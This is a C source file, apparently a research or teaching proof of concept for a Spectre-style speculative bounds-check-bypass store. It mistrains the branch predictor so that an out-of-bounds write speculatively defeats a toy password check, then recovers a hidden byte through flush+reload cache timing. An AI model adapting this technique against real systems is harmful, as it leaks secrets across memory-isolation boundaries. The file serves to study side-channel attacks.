#include <stdio.h>
#include <stdlib.h>

#include "../lib/gen_array.c"
#include "../lib/time_and_flush.c"
#include "../lib/print_results.c"

#define N_PAGES 256
#define REPETITIONS 1
#define CACHE_HIT 100
#define MAYBE_CACHE_HIT 175
#define BUF_SIZE 16

int  n_training   = 10;
int  secret_size  = 1;


/*
 * Variables required in Cache
 *  user_idx
 *  buf
 *  user_char_copy
 *  user_passwd
 *  secret
 *  super_secret
 *
 * Variables requried in mem:
 *  buf_size
 */

typedef struct cache_vars {
    char user_idx;
    char user_char;
    char user_passwd;
    char secret;
    char super_secret;
    char buf[BUF_SIZE];
} cache_vars_t;

int  buf_size __attribute__ ((aligned (256))) = BUF_SIZE;

void check_passwd(int user_idx, char user_char, char user_passwd, cp_t* arr, char super_secret) {



    //gooi dit maar in struct
    cache_vars_t cache __attribute__ ((aligned (256)));
    cache.user_idx = user_idx;
    cache.user_char = user_char;
    cache.user_passwd = user_passwd;
    cache.secret = 'x';
    cache.super_secret = super_secret;//97;

    buf_size = BUF_SIZE;
    //printf("uid = %4d\tuc = %c\tpwd=%c\n", user_idx, user_char_copy, user_passwd);
    //printf("secret p = %p\tbuf = %p\tbuf[last] = %p\toverwr = %p\n",
    //       &cache.secret, &cache.buf, &cache.buf[buf_size-1], &cache.buf[cache.user_idx]);

    /*cache.user_idx = user_idx;
    cache.user_char = user_char;
    cache.user_passwd = user_passwd;
    cache.secret = 'x';
    cache.super_secret = 97;

    buf_size = BUF_SIZE;*/

    cpuid();
    flush((void*)&buf_size);
    cpuid();


    /*if(user_char_copy=='s') {
        printf("%p\tload buf_size\n", &buf_size);
        printf("%p\tload user_char_copy\n", &user_char_copy);
        printf("%p\tload user_idx\n", &user_idx);
        printf("%p\tload buf[user_idx]\n", &buf[user_idx]);
        printf("%p\tload user_passwd\n", &user_passwd);
        printf("%p\tload secret\n", &secret);
        printf("%p\tload super secret\n", &super_secret);
        //printf("%p\tload arr\n", &arr, arr_time);
        printf("%p\tload arr[super_s]\n", &arr[super_secret]);
    }//*/
    /*if(user_char_copy=='s') {
        //als ik hier flush, wordt buf_size hierna wel gwn uit memory gefetch (ipv cache)
        int buf_size_time   = time_mem_load(&buf_size);
        int user_char_time  = time_mem_load(&user_char_copy);
        int user_idx_time   = time_mem_load(&user_idx);
        int buf_idx_time    = time_mem_load(&buf[user_idx]);
        int user_pwd_time   = time_mem_load(&user_passwd);
        int secret_time     = time_mem_load(&secret);
        int s_secret_time   = time_mem_load(&super_secret);
        int arr_time        = time_mem_load(&arr);
        int arr_access_t    = time_mem_load(&arr[super_secret]);

        printf("%p\tload buf_size       = %d\n", &buf_size, buf_size_time);
        printf("%p\tload user_char_copy = %d\n", &user_char_copy, user_char_time);
        printf("%p\tload user_idx       = %d\n", &user_idx, user_idx_time);
        printf("%p\tload buf[user_idx]  = %d\n", &buf[user_idx], buf_idx_time);
        printf("%p\tload user_passwd    = %d\n", &user_passwd, user_pwd_time);
        printf("%p\tload secret         = %d\n", &secret, secret_time);
        printf("%p\tload super secret   = %d\n", &super_secret, s_secret_time);
        //printf("%p\tload arr           = %d\n", &arr, arr_time);
        printf("%p\tload arr[super_s]   = %d\n", &arr[super_secret], arr_access_t);
    }//*/

    //bounds check should prevent overwrite. But speculatively executes
    if (cache.user_idx < buf_size) {
        //if (user_char_copy == 's') printf("\noverwriting %p with 's'\n", &buf[user_idx]);
        cache.buf[cache.user_idx] = cache.user_char;
    }

    //printf("secret = %c\n", secret);

    //secret has been (speculatively) overwritten with user char.
    if (cache.user_passwd == cache.secret) {
        volatile cp_t cp = arr[cache.super_secret];
        //printf("super secret: '%c' (%d)\n", cp.id, cp.id);
    }

}

int* overwrite(int index) {

    cp_t* arr = mmap_arr_cache_pages(N_PAGES);
    flush_arr((void*)arr, N_PAGES);

    //access decisions in array, repeated out-of-bounds not traceable for branch predictor
    int n_accesses = n_training + 1;
    int user_ids[n_accesses];
    char user_chars[n_accesses];
    char user_pwds[n_accesses];
        char user_s_secret[n_accesses];

    for(int i = 0; i < n_accesses; i++) {
        user_ids[i] = i % 16;//buf_size;
        user_chars[i] = 'a' + (i%26);
        user_pwds[i] = 'x';
            user_s_secret[i] = 'b';
    }
    user_ids[n_training] = 4094 - 512;// + 10000;
    user_chars[n_training] = 's';
    user_pwds[n_training] = 's';
        user_s_secret[n_training] = 'c';
    cpuid();

    //Misstrain branch predictor, access out of bounds on last call
    for(int i = 0; i < n_accesses; i++) {
        check_passwd(user_ids[i], user_chars[i], user_pwds[i], arr, user_s_secret[i]);
        //ensures completion before flushing. bar prevents speculative access from being flushed
        cpuid();
        if(user_pwds[i] != 's') {
            asm volatile ("cpuid\n":::);
            flush((void*)&arr[user_s_secret[i]]);
        }
        cpuid();
    }

    //make sure previous loop finishes execution
    cpuid();

    //time loading duration per array index
    int* results = reload(arr, N_PAGES, CACHE_HIT, MAYBE_CACHE_HIT);
    unmap_cache_pages(arr, N_PAGES);
    return results;
}


int main(int argc, char** argv) {

    int*** results = alloc_results(REPETITIONS, secret_size, N_PAGES); //results[REPETITIONS][secret_size][N_PAGES]ints
    results[0][0] = overwrite(0);
    /*for(int r = 0; r < REPETITIONS; r++) {
        printf("\nREPETITION %d\n", r);
        for (int s = 0; s < secret_size; s++) {
            results[r][s] = overwrite(s);
            __sync_synchronize();
        }
    }*/
    print_results(results, REPETITIONS, secret_size, N_PAGES, CACHE_HIT);

    free_results(results, REPETITIONS, secret_size);
    //check_passwd(11, 's', 's');

    //reload();

    //print_results
}